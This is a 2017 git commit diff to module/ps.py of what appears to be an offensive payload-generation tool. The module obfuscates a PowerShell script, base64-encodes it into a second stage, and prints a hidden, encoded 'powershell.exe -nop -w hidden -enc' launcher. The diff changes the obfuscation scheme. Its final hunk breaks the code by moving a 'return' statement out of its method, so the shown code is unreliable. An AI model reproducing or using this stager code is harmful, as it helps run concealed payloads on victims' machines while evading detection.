da30dcba12b7c9007f719cebcc2a8a6f01e26ca2
Mr.Un1k0d3r <mr.un1k0d3r@gmail.com>
2017-10-12 18:02:19 -0400

    Update ps.py

--- module/ps.py
+++ module/ps.py
@@ -26,17 +26,11 @@ class PsModule(ModuleObject):
                 stage1 = stage1.replace("var" + str(i), self.gen_str(random.randrange(3, 10)))
 			
         path = self.write_file(stage1)
-	letter = random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase)
-	letter2 = random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase)
-        stage1 = self.read_file(path).replace(letter, "!")
-	stage1 = stage1.replace(letter2, "$")
+        stage1 = self.read_file(path).replace("A", "!")
         self.delete_file(path)
-	
         stage2 = self.load_file("core/util/base64.ps1").replace("[BASE64]", stage1)
-	stage2 = stage2.replace("[CHAR1]", letter)
-	stage2 = stage2.replace("[CHAR2]", letter2)
-	for i in range(1, 3):
-                stage2 = stage2.replace("VAR" + str(i), self.gen_str(random.randrange(3, 10)))
+	for i in range(1,3):
+		stage2 = stage2.replace("VAR" + str(i), self.gen_str(random.randrange(3, 10)))
 		
         self.ui.print_msg("Powershell script:")
         print "powershell.exe -nop -w hidden -enc %s" % self.convert_to_unicode(stage2)
@@ -72,4 +66,4 @@ class PsModule(ModuleObject):
         os.unlink(path)
         
     def read_file(self, path):
-        return base64.b64encode(open(path, "rb").read())
+return base64.b64encode(open(path, "rb").read())
